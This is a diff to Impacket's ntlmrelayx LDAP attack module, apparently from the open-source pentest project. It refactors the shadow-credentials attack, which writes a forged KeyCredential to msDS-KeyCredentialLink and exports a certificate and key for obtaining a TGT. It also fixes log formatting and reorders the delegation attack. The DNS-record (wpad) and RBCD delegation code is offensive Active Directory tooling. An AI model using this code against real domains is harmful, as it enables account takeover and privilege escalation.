@@ -1,6 +1,8 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -42,11 +44,7 @@ from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.structure import Structure, hexdump
-
-from dsinternals.system.Guid import Guid
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.system.DateTime import DateTime
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
 
 # This is new from ldap3 v2.5
 try:
@@ -286,12 +284,12 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate = X509Certificate2(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, nBefore=(-40 * 365), nAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
-        LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
-        LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+        keyCredential = shadow_credentials.KeyCredential(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
+        #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+        #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.client.response:
@@ -302,7 +300,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
@@ -313,7 +311,7 @@ class LDAPAttack(ProtocolAttack):
                 else:
                     path = self.config.ShadowCredentialsOutfilePath
                 if self.config.ShadowCredentialsExportType == "PEM":
-                    certificate.ExportPEM(path_to_files=path)
+                    shadow_credentials.exportPEM(certificate,key,path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
@@ -325,7 +323,7 @@ class LDAPAttack(ProtocolAttack):
                         LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
                     else:
                         password = self.config.ShadowCredentialsPFXPassword
-                    certificate.ExportPFX(password=password, path_to_file=path)
+                    shadow_credentials.exportPFX(certificate,key,password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
@@ -681,10 +679,12 @@ class LDAPAttack(ProtocolAttack):
 
             for ace in (a for a in sd["Dacl"]["Data"] if a["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                 sid = format_sid(ace["Ace"]["Sid"].getData())
-                if ace["Ace"]["ObjectTypeLen"] == 0:
+                if ace["Ace"]["Flags"] == 2:
                     uuid = bin_to_string(ace["Ace"]["InheritedObjectType"]).lower()
-                else:
+                elif ace["Ace"]["Flags"] == 1:
                     uuid = bin_to_string(ace["Ace"]["ObjectType"]).lower()
+                else:
+                    continue
 
                 if not uuid in enrollment_uuids:
                     continue
@@ -715,7 +715,7 @@ class LDAPAttack(ProtocolAttack):
                     sid_map[sid] = sid
                     continue
 
-                if not len(self.client.response):
+                if not len(self.client.entries):
                     sid_map[sid] = sid
                 else:
                     sid_map[sid] = domain_fqdn + "\\" + self.client.response[0]["attributes"]["name"]
@@ -876,7 +876,7 @@ class LDAPAttack(ProtocolAttack):
 
         LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
         if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
-            LOG.error('Failed to add `A` record: ' % str(self.client.result))
+            LOG.error('Failed to add `A` record: %s' % str(self.client.result))
             return
 
         LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
@@ -898,7 +898,7 @@ class LDAPAttack(ProtocolAttack):
 
         LOG.info('Adding `NS` record `%s` pointing to `%s` at `%s`' % (ns_record_name, ns_record_value, ns_record_dn))
         if not self.client.add(ns_record_dn, ['top', 'dnsNode'], ns_record_data):
-            LOG.error('Failed to add `NS` record `wpad`: ' % str(self.client.result))
+            LOG.error('Failed to add `NS` record `wpad`: %s' % str(self.client.result))
             return
 
         LOG.info('Added `NS` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % ns_record_name)
@@ -920,7 +920,7 @@ class LDAPAttack(ProtocolAttack):
 
         if self.config.interactive:
             if self.tcp_shell is not None:
-                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
+                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d as %s/%s' % (self.tcp_shell.port, self.domain, self.username))
                 # Start listening and launch interactive shell.
                 self.tcp_shell.listen()
                 ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
@@ -1105,11 +1105,6 @@ class LDAPAttack(ProtocolAttack):
             if dns_name_ok and dns_ipaddr_ok:
                 self.addDnsRecord(name, ipaddr)
 
-        # Perform the Delegate attack if it is enabled and we relayed a computer account
-        if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
-            return
-
         # Add a new computer if that is requested
         # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
         if self.config.addcomputer is not None:
@@ -1122,8 +1117,12 @@ class LDAPAttack(ProtocolAttack):
             ][0]
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
-            return
 
+        # Perform the Delegate attack if it is enabled and we relayed a computer account
+        if self.config.delegateaccess and self.username[-1] == '$':
+            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+            return
+        
         # Perform the Shadow Credentials attack if it is enabled
         if self.config.IsShadowCredentialsAttack:
             self.shadowCredentialsAttack(domainDumper)
